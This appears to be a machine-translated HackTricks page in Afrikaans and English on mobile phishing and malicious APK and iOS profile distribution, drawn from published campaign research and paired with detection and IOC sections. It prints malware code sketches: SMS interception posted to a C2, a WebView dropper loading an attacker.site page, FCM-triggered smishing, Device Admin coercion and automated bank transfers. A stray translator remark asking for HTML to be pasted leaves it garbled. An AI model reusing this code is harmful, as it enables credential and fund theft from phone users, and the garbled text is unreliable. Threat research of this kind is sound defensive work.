# Mobiele Phishing & Kwaadwillige App-verspreiding (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakteurs gebruik word om **kwaadwillige Android APKs** en **iOS mobile-configuration profiles** deur phishing (SEO, social engineering, fake stores, dating apps, ens.) te versprei.
> Die materiaal is aangepas vanaf die SarangTrap campaign exposed by Zimperium zLabs (2025) en ander openbare navorsing.

## Aanvalsvloei

1. **SEO/Phishing-infrastruktuur**
* Registreer dosyne gelyklike domeine (dating, cloud share, car service…).
– Gebruik sleutelwoorde in die plaaslike taal en emoji's in die `<title>` element om in Google te rangskik.
– Host *beide* Android (`.apk`) en iOS installasie-instruksies op dieselfde landingsblad.
2. **Eerste fase aflaai**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of plain HTTPS-skakel na 'n kwaadwillige **mobileconfig** profile (sien hieronder).
3. **Na-installasie Sosiale Ingenieurswese**
* By eerste uitvoering vra die app vir 'n **invitation / verification code** (illusie van eksklusiewe toegang).
* Die kode word **POSTed over HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaat voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode indien nie, sien **geen malicious behaviour** (evasie).
4. **Misbruik van Runtime-toestemmings (Android)**
* Gevaarlike toestemmings word slegs versoek **na 'n positiewe C2-antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin-kodepad wat SMS deur reflection lees, staan ⇒ verlaag die statiese telling terwyl dit steeds funksioneel is op toestelle wat die toestemming gee via `AppOps` misbruik of ou teikens.
5. **Skyn-UI & Agtergrondversameling**
* Die app wys onskadelike weergawes (SMS viewer, gallery picker) wat plaaslik geïmplementeer is.
* Intussen exfiltreer dit:
- IMEI / IMSI, phone number
- Volledige `ContactsContract` dump (JSON array)
- JPEG/PNG van `/sdcard/DCIM` saamgepers met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS-inhoud (`content://sms`)
Payloads word **batch-zipped** en gestuur via `HTTP POST /upload.php`.
6. **iOS Afleweringstegniek**
* 'n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. versoek om die toestel in “MDM”-agtige toesig te registreer.
* Sosiale-ingenieurswese instruksies:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* drie keer (skermskote op die phishing-blad).
3. Trust the unsigned profile ➜ aanvaller verkry *Contacts* & *Photo* entitlement sonder App Store hersiening.
7. **Netwerklaag**
* Onversleutelde HTTP, dikwels op poort 80 met HOST-header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om te bespeur).

## Verdedigende Toetsing / Red-Team Wenke

* **Dynamic Analysis Bypass** – Tydens malware-assessering, outomatiseer die invitation code-fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Network Canary** – Konfigureer `iptables -p tcp --dport 80 -j NFQUEUE` om skielike POST-burstes na kode-invoer op te spoor.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oordrewe entitlements raak te sien.

## Blue-Team Opsporingsidees

* **Certificate Transparency / DNS Analytics** om skielike uitbarstings van sleutelwoordryke domeine vas te vang.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` van Dalvik-kliente buite Google Play.
* **Invite-code Telemetry** – POST van 6–8 syfer numeriese kodes kort na APK-installasie kan staging aandui.
* **MobileConfig Signing** – Blokkeer ongetekende konfigurasieprofiele via MDM-beleid.

## Nuttige Frida-snipper: Auto-Bypass Invitation Code
```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
## Aanwysers (Generies)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Hierdie patroon is waargeneem in veldtogte wat staatsvoordeel‑temas misbruik om Indiese UPI‑bewyse en OTPs te steel. Operateurs skakel betroubare platforms aaneen vir aflewering en veerkragtigheid.

### Delivery chain across trusted platforms
- YouTube‑video lokmiddel → beskrywing bevat 'n shortlink
- Shortlink → GitHub Pages phishing site wat die regte portaal naboots
- Dieselfde GitHub repo bied 'n APK aan met 'n vals “Google Play”‑kenteken wat direk na die lêer skakel
- Dinamiese phishing‑bladsye leef op Replit; die afstandbeheerkanaal gebruik Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Die eerste APK is 'n installer (dropper) wat die werklike malware by `assets/app.apk` lewer en die gebruiker vra om Wi‑Fi/mobiele data af te skakel om cloud detection te verdoof.
- Die ingebedde payload installeer onder 'n onskuldige etiket (bv. “Secure Update”). Na installasie is beide die installer en die payload as aparte apps teenwoordig.

Statiese triage‑wenk (grep vir ingebedde payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamiese endpoint-ontdekking via shortlink
- Malware haal 'n platte teks, komma-geskeide lys van lewende endpoints vanaf 'n shortlink; eenvoudige tekenreeks-transformasies produseer die finale phishing-bladsy-pad.

Voorbeeld (gesanitiseer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Die “Make payment of ₹1 / UPI‑Lite” stap laai die aanvaller se HTML-vorm vanaf die dinamiese eindpunt binne 'n WebView en vang sensitiewe velde (telefoon, bank, UPI PIN) wat as `POST` na `addup.php` gestuur word.

Minimale loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Agressiewe toestemmings word by die eerste opstart aangevra:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Die kontakte word deurgegaan om smishing-SMS massaal vanaf die slagoffer se toestel te stuur.
- Inkomende SMS word deur 'n broadcast receiver onderskep en saam met metadata (sender, body, SIM slot, per-device random ID) na `/addsm.php` opgelaai.

Ontvanger-skets:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Die payload registreer by FCM; push-boodskappe dra 'n `_type` veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv. bywerk van phishing-tekssjablone, skakel gedrag aan/af).

Voorbeeld FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Jagpatrone en IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltreer na `/addup.php`
- SMS-exfiltrasie na `/addsm.php`
- Shortlink-gedrewe config fetch (bv. `rebrand.ly/*`) wat CSV endpoints teruggee
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data` boodskappe met 'n `_type` discriminator in onbetroubare apps

### Opsporing & verdediging idees
- Merk apps wat gebruikers instrueer om netwerk tydens installasie af te skakel en daarna 'n tweede APK vanaf `assets/` side-load.
- Waarsku op die toestemmings-tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-gebaseerde betalingsvloei.
- Monitering van uitgaande verkeer vir `POST /addup.php|/addsm.php` op nie-korporatiewe hosts; blokkeer bekende infrastruktuur.
- Mobile EDR-reëls: onbetroubare app registreer vir FCM en takke op 'n `_type` veld.

---

## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn gevallestudie

Die RatOn banker/RAT veldtog (ThreatFabric) is 'n konkrete voorbeeld van hoe moderne mobile phishing-operasies WebView droppers, Accessibility-gedrewe UI-automatisering, overlays/ransom, Device Admin-gedwonge, Automated Transfer System (ATS), crypto wallet-oortaking, en selfs NFC-relay orkestrasie kombineer. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Fase-1: WebView → native install bridge (dropper)
Aanvallers wys 'n WebView wat na 'n aanvalerbladsy wys en injekteer 'n JavaScript-interface wat 'n native installer blootstel. 'n Tik op 'n HTML-knoppie roep native kode aan wat 'n tweede-fase APK geïnstalleer wat in die dropper se assets ingepak is en dit dan direk lanceer.

Minimale patroon:
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Ek het nie die HTML-inhoud van die bladsy ontvang nie. Plak asseblief die HTML/markdown-inhoud wat jy wil hê ek moet vertaal, en ek sal dit na Afrikaans vertaal volgens die gegewe reëls.
```html
<button onclick="bridge.installApk()">Install</button>
```
Na installasie, begin die dropper die payload via eksplisiete package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n ingeslote sekondêre payload onder `assets/` versend en die Package Installer Session API aanroep.

### Toestemmingstrechter: Accessibility + Device Admin + follow-on runtime prompts
Stage-2 open 'n WebView wat 'n “Access” bladsy huisves. Sy knoppie roep 'n exported method aan wat die slagoffer na die Accessibility-instellings navigeer en vra om die rogue service te aktiveer. Sodra dit toegestaan is, gebruik malware Accessibility om outomaties deur opvolgende runtime permission dialogs (contacts, overlay, manage system settings, ens.) te klik en versoek Device Admin.

- Accessibility programmeerbaar help om later versoeke te aanvaar deur knoppies soos “Allow”/“OK” in die node-tree te vind en klikke te stuur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Oorskerm phishing/ransom via WebView
Operateurs kan opdragte gee om:
- toon 'n volskerm-oorskerm vanaf 'n URL, of
- stuur inline HTML wat in 'n WebView-oorskerm gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet-openings om PIN's vas te vang, ransom-boodskappe. Hou 'n opdrag om te verseker dat die overlay-toestemming gegee is indien dit ontbreek.

### Remote control model – teks pseudo-skerm + screen-cast
- Lae-bandwydte: periodies die Accessibility node-boom uitgooi, sigbare tekste/rolle/bounds serialiseer en na C2 stuur as 'n pseudo-skerm (opdragte soos `txt_screen` eenmalig en `screen_live` voortdurend).
- Hoë-fideliteit: versoek MediaProjection en begin screen-casting/recording op aanvraag (opdragte soos `display` / `record`).

### ATS playbook (bank app outomatisering)
Gegee 'n JSON-taak, open die bank-app, bestuur die UI via Accessibility met 'n mengsel van teksnavrae en koördinaat-tappe, en voer die slagoffer se betaal-PIN in wanneer daar om gevra word.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Nuwe betaling"
- "Zadat platbu" → "Voer betaling in"
- "Nový příjemce" → "Nuwe ontvanger"
- "Domácí číslo účtu" → "Inlandse rekeningnommer"
- "Další" → "Volgende"
- "Odeslat" → "Stuur"
- "Ano, pokračovat" → "Ja, gaan voort"
- "Zaplatit" → "Betaal"
- "Hotovo" → "Klaar"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
Device Admin APIs are used to increase PIN-capture opportunities and frustrate the victim:

- Immediate lock:
```java
dpm.lockNow();
```
- Laat huidige credential verval om verandering af te dwing (Accessibility vang nuwe PIN/password op):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Dwing nie-biometriese ontsluiting deur keyguard se biometriese funksies uit te skakel:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Let wel: Baie DevicePolicyManager-beheer vereis Device Owner/Profile Owner op onlangse Android; sommige OEM-bouwerk kan laks wees. Valideer altyd op die teiken OS/OEM.

### NFC-relay orkestrasie (NFSkate)
Stage-3 kan 'n eksterne NFC-relaismodule installeer en begin (e.g., NFSkate) en selfs 'n HTML-sjabloon daaraan oorhandig om die slagoffer tydens die relais te lei. Dit maak kontakslose card-present cash-out moontlik tesame met aanlyn ATS.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Detection & defence ideas (RatOn-style)
- Soek na WebViews met `addJavascriptInterface()` wat installer-/permission-metodes blootstel; bladsye wat eindig op “/access” wat Accessibility-promptte uitlok.
- Waarsku op apps wat kort ná verkryging van service-toegang 'n hoë tempo Accessibility-gebare/klikke genereer; telemetrie wat lyk soos Accessibility node dumps na C2 gestuur word.
- Houd dop vir Device Admin-beleidwysigings in onbetroubare apps: `lockNow`, password expiration, keyguard feature toggles.
- Waarsku vir MediaProjection-promptte van nie-korporatiewe apps wat gevolg word deur periodieke raamoplaaie.
- Detecteer die installasie/aanvang van 'n eksterne NFC-relais-app wat deur 'n ander app getrigger word.
- Vir bankdienste: dwing out-of-band bevestigings af, biometrie-binding, en transaksie-limiete af wat weerstandbiedend is teen on-device automatisering.

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

{{#include ../../banners/hacktricks-training.md}}
